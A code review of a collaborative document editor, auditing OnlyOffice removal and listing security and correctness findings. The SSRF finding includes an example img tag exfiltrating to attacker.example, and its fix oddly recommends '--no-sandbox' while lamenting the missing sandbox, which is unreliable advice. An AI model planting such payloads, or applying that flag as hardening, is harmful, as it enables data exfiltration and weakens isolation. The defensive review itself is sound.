# Docs — Senior Review

## Summary
The native Docs surface is structurally in good shape: per-doc authorization is enforced on every Yjs upgrade, mention notifications fan out, suggestions/comments/versions all have rails, and a Chromium PDF renderer falls back to a deterministic stub. However several non-trivial gaps remain — comment anchors are absolute ProseMirror positions (they drift on every edit), the Chromium renderer trusts arbitrary `document.html` and lets it hit the network, the `concurrent editors` quota check is racy, and large portions of the OnlyOffice integration are still wired into the runtime, the routes, the schema, env files, compose, and seed data. The frontend has two ~1.7k-line monoliths (`native-document-editor.tsx`, `native-document-shell.tsx`) that desperately need decomposition, and the shared `EditorAppBar` exposes a `presence` prop that the Docs shell never populates, so multi-user awareness is functionally invisible to users.

## Scorecard
- Security: 3/5 — Per-doc auth + JWT WS token are correct; but Chromium PDF renderer + raw `document.html` injection, `escapePdfText` truncation, and weak DOCX hardening (no zip-bomb / entry-count guard) are real concerns.
- Correctness: 3/5 — Auth, transactions, and persistence are solid; comment/suggestion anchors stored as absolute positions and the quota race window will bite under real co-edit load.
- Feature completeness: 3/5 — Comments, suggestions, versions, mentions, DOCX import, MD/PDF/DOCX/EPUB export, find/replace, smart compose all present; missing UI presence cursors, comment notifications outside @mention, real track-changes UI, mobile, and a true OnlyOffice-removal path.
- Code quality: 2/5 — Two files >1700 lines, prop-drilling through shell→editor→rails, frozen `legacy-yjs` and `onlyoffice-ooxml` branches still in production type unions, and many `// TODO v1` stubs in the chrome.

---

## OnlyOffice removal audit

The integration is still extensively wired and several call sites assume it remains the fallback "reference" editor. Full deletion punch list (every reference found by `grep -ri onlyoffice` across `/Users/mj/mjcode/helix-all/helix-workspace`):

### Backend code to delete wholesale
- `apps/helix/src/platform/onlyoffice/index.ts` — re-exports.
- `apps/helix/src/platform/onlyoffice/routes.ts` — `registerOnlyOfficeRoutes`, the three endpoints `GET /api/onlyoffice/config/:objectId`, `GET /api/onlyoffice/file/:token`, `POST /api/onlyoffice/callback/:token`, plus the `documentType` mapping at line 299.
- `apps/helix/src/platform/onlyoffice/jwt.ts` — `signOnlyOfficeJwt`, `verifyOnlyOfficeJwt`, `verifyOnlyOfficeSignatureOnly`, `OnlyOfficeJwtPayload`, `JwtVerifyResult`.
- `apps/helix/src/platform/onlyoffice/routes.test.ts`, `routes-storage.test.ts` — entire test files.

### Backend wiring to rip out
- `apps/helix/src/server.ts:926-932` — comment block + `maxParamLength: 2048` justification (still needed for app-passwords? verify before reverting).
- `apps/helix/src/server.ts:2556-2569` — `if (process.env.HELIX_ONLYOFFICE_ENABLED !== "false")` registration block and dynamic import.
- `apps/helix/src/platform/docs/types.ts:44` — `"onlyoffice-ooxml"` member of `DocsEditorEngine` union (also forces a doc backfill).
- `apps/helix/src/platform/docs/native-state.ts:5` — `ONLYOFFICE_OOXML_DOCUMENT_ENGINE` constant and any importers.
- `packages/sdk-types/src/editors.ts:17` — `"onlyoffice-compat"` literal in `EDITORS_OOXML_FIDELITY_MODES`. Cascade-deletes the entire fidelity-mode concept.
- `apps/helix/src/platform/editors/core-app.test.ts:41,50` — fixtures asserting `ooxmlFidelityMode: "onlyoffice-compat"`.

### Frontend code to delete
- `apps/web/src/routes/_shell/edit/$objectId.tsx` — entire route file (`ONLYOFFICE_PUBLIC_URL`, `ONLYOFFICE_API_JS_PATH`, the `<script>` injection, `OnlyOfficeConfig` interface, the iframe placeholder mount). 230+ lines.
- `apps/web/src/features/_open/ui/UnsupportedFormatPlaceholder.tsx:205-214` — "Open in reference editor" `<Link to="/edit/$objectId">` button; remove `inProgress` branch since it only existed for the OO fallback.
- `apps/web/src/features/docs/api.ts:75` — `editorEngine?: "legacy-yjs" | "onlyoffice-ooxml" | "helix-native-document"` union; drop the OO member.
- `apps/web/src/features/docs/docs-shell.test.tsx:257` — `editorEngine: "onlyoffice-ooxml"` fixture.

### Frontend comment-only references (still mention OO; rewrite or remove)
- `apps/web/src/features/sheets/queries.ts:85-86`
- `apps/web/src/features/sheets/sheets-shell.tsx:111-113`
- `apps/web/src/features/sheets/model.ts:108`
- `apps/web/src/features/slides/slides-shell.tsx:56`
- `apps/web/src/features/slides/queries.ts:79`
- `apps/web/src/features/docs/queries.ts:202`
- `apps/web/src/features/docs/docs-shell.tsx:126`
- `apps/web/src/features/drive/drive-shell.tsx:160,562`
- `apps/web/src/features/drive/api.ts:349,369`
- `apps/web/src/features/_open/ui/UniversalEditorRouter.tsx:11-12`
- `apps/web/src/features/_open/ui/ImportedPdfRenderer.tsx:8`

### Env, compose, and infra
- `.env:68-73` — `ONLYOFFICE_PORT`, `ONLYOFFICE_JWT_SECRET`, `HELIX_ONLYOFFICE_ENABLED`, `HELIX_ONLYOFFICE_INTERNAL_URL`, `HELIX_ONLYOFFICE_PUBLIC_URL`.
- `docker-compose.yml:177-203` — entire `onlyoffice:` service block (the ~1 GB image).
- `docker-compose.yml:585-587` — `onlyoffice-data`, `onlyoffice-log`, `onlyoffice-lib` volumes.

### DB / seed / migration
- `apps/helix/src/db/migrations/0029_freeze_native_editor_tables.sql:3,6,25` — header comment + `comment on table` text claiming OnlyOffice is authoritative. Add a follow-up migration that updates `editor_engine = 'helix-native-document'` for any `onlyoffice-ooxml` rows and tightens the CHECK constraint.
- `apps/helix/src/db/migrate-native-to-ooxml.ts` — entire phase-4 migration script (`Phase 4 of the OnlyOffice migration`). Quarantine into `archive/` or delete after confirming no production deploy still needs it.
- `apps/helix/src/db/seed-corpus.ts:46,399` — comment references to the OnlyOffice config endpoint.
- `apps/helix/src/db/backfill-empty-objects.ts:76` — comment.
- `apps/helix/src/db/reseed.ts:18` — comment.
- `apps/helix/src/db/seed-scenarios.ts:85,153,316,433` — demo chat/email/calendar copy mentioning the OnlyOffice integration ("show off real-time co-edit on the new OnlyOffice integration", "Acme demo", "OnlyOffice JWT errors"); rewrite to reference native editors.

### helix-editors sibling repo (separate PR likely)
- `packages/engine-ooxml/src/index.ts:10`, `packages/format-loader/src/parsers/docx.ts:12`, `xlsx.ts:11`, `pptx.ts:11` — spec-reference comments. Keep ECMA-376 ref, strip OnlyOffice attribution.
- `packages/core-app/src/index.test.ts:61,66` — `"onlyoffice-compat"` fixture, dies with the SDK type.
- `packages/editor-document/src/index.test.ts:162`, `packages/editor-presentation/src/index.test.ts:67` — tests asserting `isNativeDocument({ editorEngine: "onlyoffice" })`. Replace with non-native cases that aren't OO-specific.

### Test-corpus parity verification
None of the universal-loader → format-loader → ImportedDocumentRenderer / ImportedSheetRenderer / ImportedDeckRenderer files reference OnlyOffice in their parse path. The "Open in reference editor" Link is the only runtime escape hatch. Once `/edit/$objectId` and the placeholder branch are gone, every corpus file routes through `UniversalEditorRouter` → native renderer (or `UnsupportedFormatPlaceholder` download-only). Verify the test corpus opens by removing the `inProgress` branch first and watching for any format that lands on the dead Link.

---

## Findings

### S1: Chromium PDF renderer trusts `document.html` and waits for `networkidle` · severity: CRITICAL · category: security
**File**: `apps/helix/src/platform/docs/export/formats.ts:282-284` + `apps/helix/src/platform/docs/export/chromium.ts:56-58`
**What's wrong**: `renderHtmlForPdf` returns `document.html` verbatim (only running token replacement) when present, and `chromium.ts` then calls `page.setContent(input.html, { waitUntil: "networkidle" })`. Any `<img src="https://attacker.example/log?...">`, `<link rel="stylesheet" href="…">`, or `<iframe>` inside the doc HTML causes the headless browser to issue outbound requests on the server's network. This is SSRF (internal metadata service, internal admin endpoints) and a tenant-data exfil channel during PDF export. Sandbox is also not configured (`--no-sandbox`/`--disable-extensions` not set).
**Fix**: Sanitize `document.html` with a strict allowlist (DOMPurify or a server-side equivalent) before passing it to Chromium, switch to `waitUntil: "domcontentloaded"`, run Chromium with `args: ['--no-sandbox', '--disable-dev-shm-usage', '--block-new-web-contents']`, set `page.route('**', r => r.abort())` to drop all subresource requests, and add a hard request-count guard.
**Effort**: M

### S2: Comment / suggestion anchors stored as absolute ProseMirror positions · severity: HIGH · category: bug
**File**: `apps/web/src/features/docs/native-document-anchors.ts:22-71` and `apps/web/src/features/docs/native-document-comments-rail.tsx:115`
**What's wrong**: `nativeDocumentAnchor()` serializes the literal `{from, to, text}` from the current TipTap selection. As soon as any peer inserts text earlier in the doc, every existing comment anchor drifts. Real Yjs apps store `Y.RelativePosition` so anchors survive concurrent edits. The decoration layer then renders the comment at the wrong span (sometimes mid-word, sometimes off-screen).
**Fix**: Replace selection `from/to` with `Y.createRelativePositionFromTypeIndex(...)` / `createAbsolutePositionFromRelativePosition` round-tripped via `Y.encodeRelativePosition` for the wire format. Keep `text` as a hint for fallback re-anchoring after restoration.
**Effort**: L

### S3: Quota check has TOCTOU race window · severity: HIGH · category: bug
**File**: `apps/helix/src/platform/docs/routes.ts:181-188`
**What's wrong**: `activeDocsSocketCount` is read and compared, then `handleYjsDocsSocket` adds the socket to the room a few async ticks later (after `getOrCreateYjsRoom`, `sendYjsSyncMessage`, `sendAwarenessSnapshot`). Two concurrent connects can both pass the check and both be admitted, exceeding the configured `collab_concurrent_editors_per_doc` quota.
**Fix**: Reserve a slot atomically: insert into the room first with a "pending" marker, run the auth/quota check against the post-insert count, and remove on rejection.
**Effort**: S

### S4: DOCX import has no zip-bomb / entry-count guard · severity: HIGH · category: security
**File**: `apps/helix/src/platform/docs/tools.ts:105-114, 1175-1195`
**What's wrong**: `contentBase64` is bounded at 25 MB, but Mammoth decompresses the zip internally with no upper bound on the expanded size or entry count. A 100 KB nested-zip / repeated-deflate DOCX can expand to gigabytes (CVE-2018-1000620-class). Mammoth runs in-process on the API node, so this DoSes the whole tenant.
**Fix**: Wrap the import in a child-process / worker_thread with `--max-old-space-size`, cap total uncompressed bytes (e.g. 200 MB), entry count (e.g. 5000), and per-entry depth. Reject `.docm` (macro-enabled) explicitly. Add a watchdog timeout (~30 s).
**Effort**: M

### S5: `EditorAppBar` `presence` prop is never populated · severity: HIGH · category: missing
**File**: `apps/web/src/features/docs/native-document-shell.tsx:517-537` and `apps/web/src/features/docs/native-document-editor.tsx:328-350`
**What's wrong**: `NativeDocumentYjsProvider` wires awareness end-to-end, the local actor sets its `awareness.setLocalState({actor: {...}})`, and the server fans awareness updates to peers. But nothing reads `awareness.getStates()` to drive the `presence={...}` prop on `EditorAppBar` — so the avatar stack never lights up, and TipTap has no decoration plugin rendering remote carets. From a user's perspective there are no co-editors visible despite the wire protocol working.
**Fix**: Add a small hook in the shell that subscribes to `awareness.on("change", …)`, maps `getStates()` → `EditorAppBarPresenceUser[]`, and passes it as `presence`. Add `@tiptap/extension-collaboration-cursor` to the editor's extensions, configured with the same provider.
**Effort**: M

### S6: Yjs WS auth fallback uses `access_token` in the URL · severity: MEDIUM · category: security
**File**: `apps/web/src/features/docs/native-document-yjs-provider.ts:196-204` and `apps/web/src/lib/auth.ts:64-77`
**What's wrong**: The browser appends the access token to the WebSocket URL as a query param. URLs are logged by every reverse proxy, NGINX `access.log`, cloud LB, Sentry "URL of error", and even sometimes the browser referer. There is no token expiry shortening or `Sec-WebSocket-Protocol` token frame.
**Fix**: Switch to the `Sec-WebSocket-Protocol` channel for auth (`['helix.v1', accessToken]`) and have the Fastify upgrade hook read it from headers, OR use a short-lived (sub-minute) one-time WS ticket. Filter `access_token` out of every logging middleware as a defense-in-depth.
**Effort**: M

### S7: PDF scaffold silently truncates content to 42 lines × 96 chars · severity: MEDIUM · category: bug
**File**: `apps/helix/src/platform/docs/export/formats.ts:372-391`
**What's wrong**: `renderPdfScaffold` slices `lines` to the first 42 and each line to 96 chars without surfacing a warning. When the Chromium renderer is unavailable (any error throws into the catch at line 145), users export a "PDF" that silently drops 99% of their content. The fallback also stamps `fallback: true` in metadata but nothing in the UI surfaces that flag.
**Fix**: Either remove the deterministic scaffold and surface a hard "PDF export unavailable" error to the client, or write a multi-page PDF that paginates the full text. At minimum, raise a `console.warn` on the API side and surface `metadata.fallback === true` in the download mutation.
**Effort**: M

### S8: Concurrent Yjs append per-update fan-out causes O(n²) state encoding · severity: MEDIUM · category: quality
**File**: `apps/helix/src/platform/docs/routes.ts:469-479`
**What's wrong**: `persistAndBroadcastYjsUpdate` calls `Y.encodeStateAsUpdate(room.doc)` on every single update (line 477) just to stuff `stateBase64` into row metadata. For a doc with 10k accumulated ops, every keystroke re-encodes the full state — that is O(n²) total bytes written per edit session, plus a per-keystroke JSON allocation. The `scheduleYjsCompaction` step encodes it again on a 250 ms debounce.
**Fix**: Drop the per-update `stateBase64` write — keep only the incremental update in `docs_updates.update`; compaction already produces the full state. The row metadata can store just the actor + protocol.
**Effort**: S

### S9: `markdownInlineToHtml` link regex accepts `#…` and `https?://` only, dropping safer paths and rendering `javascript:` if reordered · severity: MEDIUM · category: security
**File**: `apps/helix/src/platform/docs/export/formats.ts:1187-1207`
**What's wrong**: Current allowlist is good (`#…` or `https?://…`). But the pattern is brittle: a future contributor extending the alternation (e.g. adding `mailto:`) will quickly enable `javascript:` if they swap to a generic URL pattern. There's no schema-deny step. Also, `escapeXmlAttribute` is the only escape on the href — if `escapeXmlAttribute` ever omits a character or the value contains JS-protocol homoglyphs, the link is live in the rendered PDF.
**Fix**: Centralize URL validation in a `safeHref(value)` helper that returns `#` for any non-allowlisted scheme, and call it for both PDF and EPUB renderers. Add a unit test specifically rejecting `javascript:`, `data:`, `vbscript:`, `file:`.
**Effort**: S

### S10: `ydocFromStoredState` falls back to interpreting random bytes as UTF-8 markdown · severity: MEDIUM · category: bug
**File**: `apps/helix/src/platform/docs/routes.ts:574-585` and `native-state.ts:64-76`
**What's wrong**: If `Y.applyUpdate` throws (corrupt state), the code interprets the same bytes as UTF-8 and inserts them into a `text:"markdown"` channel. A user with a corrupt doc therefore opens an editor full of binary garbage; worse, when the editor saves a new Yjs update on top of that, the corruption is now serialized into the Yjs log.
**Fix**: On `Y.applyUpdate` failure, return an empty doc, log loudly, and mark the document `metadata.recovery_required = true` so the UI shows a "this document is unrecoverable — restore from version history" banner instead of presenting garbage.
**Effort**: S

### S11: Two oversized monolithic frontend files · severity: MEDIUM · category: quality
**File**: `apps/web/src/features/docs/native-document-editor.tsx` (1951 lines) and `apps/web/src/features/docs/native-document-shell.tsx` (1730 lines)
**What's wrong**: Both files mix React state, ProseMirror plugins, Yjs wiring, find/replace logic, smart-compose AI, equation editing, cross-references, layout, and inline CSS-in-JS objects. The shell single-handedly registers ~14 command-palette items, builds menus + ribbon, owns title/layout/export mutations, owns 5 side-panel tabs, and renders the page chrome. This makes code review, codegen-assisted refactors, and bundle-splitting all painful.
**Fix**: Carve the editor into `find-replace.tsx`, `smart-compose.tsx`, `equation-editor.tsx`, `cross-references.tsx`, `chrome-decorations.ts`. Carve the shell into `command-palette.tsx`, `layout-state.ts`, `side-panel-tabs.tsx`. Move every `…_STYLE` const into a single `styles.ts` or replace with Tailwind classes.
**Effort**: L

### S12: `"legacy-yjs"` editor engine + migration UI still in production type unions · severity: LOW · category: quality
**File**: `apps/web/src/features/docs/api.ts:75`, `apps/web/src/features/docs/doc-list.tsx:311-313`, `apps/helix/src/platform/docs/native-state.ts:4`
**What's wrong**: The frontend still ships an `editorEngine: "legacy-yjs"` type alternative and a `migrateToNativeDocument` mutation surfaced in the doc list. With the rewrite shipped, this is dead code that hides bugs (e.g. the `isLegacyDocument` branch in `doc-list.tsx` still renders a "Migrate" CTA — easy to mis-click). Combined with the OnlyOffice cleanup, the entire `DocsEditorEngine` union collapses to a single literal.
**Fix**: Run a DB backfill that updates any `editor_engine != 'helix-native-document'`, then drop the union, the constant, the migration store method, and the doc-list branch.
**Effort**: M

### S13: Comment notifications only fire for explicit `@mention` · severity: LOW · category: missing
**File**: `apps/helix/src/platform/docs/store.ts:1985-2064`
**What's wrong**: `insertNotification` only fires when `mentionTokensForComment` returns non-empty. Comment authors who reply to a thread don't notify the thread participants; doc owners aren't notified of comments on their docs; resolved/reopened transitions don't notify the comment author. Google Docs / Confluence notify all of these.
**Fix**: After mention-fan-out, also notify (a) the thread's original commenter on every reply, (b) the doc owner on top-level comments, (c) the comment author on resolve/reopen. Dedupe against the actor performing the action.
**Effort**: M

### S14: No optimistic concurrency on title / layout / comment edits · severity: LOW · category: bug
**File**: `apps/helix/src/platform/docs/store.ts` (`updateTitle`, `updateLayout`, `updateComment`)
**What's wrong**: Only `restoreVersion` (line 1564) checks `expectedCurrentUpdateSeq`. Two users renaming the doc simultaneously will silently last-write-wins. Two users editing the same comment body race the same way. There's no `If-Match` / version conditional in the routes either.
**Fix**: Add an `expectedUpdatedAt`/`expectedVersion` to mutation inputs; reject with HTTP 409 if mismatched; surface in the UI as "another user just changed this; reload?".
**Effort**: M

### S15: `escapePdfText` strips non-ASCII to `?` · severity: LOW · category: bug
**File**: `apps/helix/src/platform/docs/export/formats.ts:417-419`
**What's wrong**: All non-ASCII bytes are replaced with `?`. Even with the Chromium fallback in place, non-English users exporting via the deterministic scaffold (when Chromium isn't installed, or fails) get titles like "????? ????" rendered as question marks. The PDF stream is also Helvetica-only, no font embedding.
**Fix**: Either gate this codepath behind a feature flag and require Chromium for any non-ASCII document, or generate a UTF-16BE-encoded string per the PDF spec and embed a Unicode font.
**Effort**: M

### S16: Several `// TODO v1` stubs ship as dead chrome interactions · severity: LOW · category: quality
**File**: `apps/web/src/features/docs/native-document-shell.tsx:23, 428-430, 439-441, 533-536`
**What's wrong**: "Rename" callback, "Smart compose" callback, and "Share" pill all explicitly no-op (`// TODO v1`). Users click Share, nothing happens, no toast. The `// TODO v1: wire menu-launched modals (Find/Replace, Equation, Word count, Share)` comment at the top is a confession that the menus are wired but the modals don't exist.
**Fix**: Either remove the buttons from the chrome until the modals are implemented, or surface "Coming soon" tooltips. Don't ship interactive no-ops.
**Effort**: S

### S17: `nativeDocumentSelectionFromAnchor` accepts unsafe-but-finite integers · severity: LOW · category: bug
**File**: `apps/web/src/features/docs/native-document-anchors.ts:47-71`
**What's wrong**: Uses `Number.isSafeInteger` which accepts negative numbers. With a malicious or stale `from: -1, to: 5`, the decoration plugin runs `Decoration.inline(-1, 5, …)` and ProseMirror throws synchronously, breaking the entire editor surface for that user (server-stored anchor poisoning).
**Fix**: Tighten to `from >= 0 && to > from && to - from <= MAX_SELECTION_LENGTH`. Clamp at the decoration layer too.
**Effort**: S

### S18: Yjs awareness encoder catches generic Error and silently skips broadcast · severity: LOW · category: bug
**File**: `apps/helix/src/platform/docs/routes.ts:383-393`
**What's wrong**: The `try { update = encodeAwarenessUpdate(...) } catch {}` swallows the only meaningful diagnostic when awareness state ordering races with disconnect. We've already had to write an explanatory comment about a "Cannot read properties of undefined (reading 'clock')" crash here — silencing the next variant of that bug will be costly to debug.
**Fix**: Pass the error through `options.onError` (already plumbed). Log + telemetry. Keep the best-effort fallback.
**Effort**: S

### S19: `DocxComment.id` overflow potential for >2³¹ comments in DOCX export · severity: LOW · category: bug
**File**: `apps/helix/src/platform/docs/export/formats.ts:421-426, 1251-1263`
**What's wrong**: `DocxComment.id: number` uses array index; Word treats comment IDs as 32-bit signed. Docs with >2³¹ comments overflow; but more practically, since IDs are array-positional, exporting the same doc twice with different `includeComments` filters produces different IDs for the same logical comment, breaking diffing/round-trip stability.
**Fix**: Use a stable hash of the comment UUID modulo 2³¹ (and reject collisions defensively).
**Effort**: S

### S20: Export endpoint does not enforce any per-org bytes / day cap · severity: LOW · category: security
**File**: `apps/helix/src/platform/docs/tools.ts:446-499`
**What's wrong**: `consumeExportJobQuota` enforces a job count but nothing enforces output bytes. A user can repeatedly export a 90 MB DOCX with `includeComments: true` and metering can't surface "we exported 4 GB today for this tenant". The PDF renderer also doesn't enforce a max page count, so a pathological doc can hog Chromium for the configured 15 s timeout repeatedly.
**Fix**: Add a per-tenant daily export bytes counter (Redis), a per-job max byte cap before persistence, and a hard page-count cap inside the Chromium PDF renderer.
**Effort**: M

### S21: `markdownFromPlainText` / `textFromHtml` strip everything but text — exports silently lose structure for non-native-Yjs docs · severity: LOW · category: bug
**File**: `apps/helix/src/platform/docs/export/formats.ts:170-211, 241-246`
**What's wrong**: For any document with no `markdown` field and only `html`, the markdown fallback regex-strips every tag, then re-emits each line as a `<p>`. Lists, headings, tables, images all collapse to flat paragraphs in the export. This used to work via the (now-frozen) legacy-yjs path, but now any imported HTML doc exports as text.
**Fix**: Use a server-side HTML→markdown converter (Turndown) for the fallback, mirroring what we do client-side. Add an end-to-end test that imports a legacy HTML doc and round-trips it through the markdown export.
**Effort**: M

### S22: Editor lazy-loads via dynamic import while shell renders chrome — large CLS on first open · severity: LOW · category: quality
**File**: `apps/web/src/features/docs/native-document-shell.tsx:81-85, 615-624`
**What's wrong**: The editor is `lazy()` while the shell's fallback renders a `DocumentBlocks` static projection of the same content. When the editor mounts ~300-800 ms later, ProseMirror's DOM replaces the fallback, causing layout shift (rulers re-measure, headings re-flow, anchors re-decorate). Awareness providers also reconnect on every navigation.
**Fix**: Either ship the editor in the main bundle (the smart-compose AI and Yjs runtime are already heavy enough that the savings are marginal), or render the fallback inside an invisible container the same size as the editor and only swap once mounted.
**Effort**: S
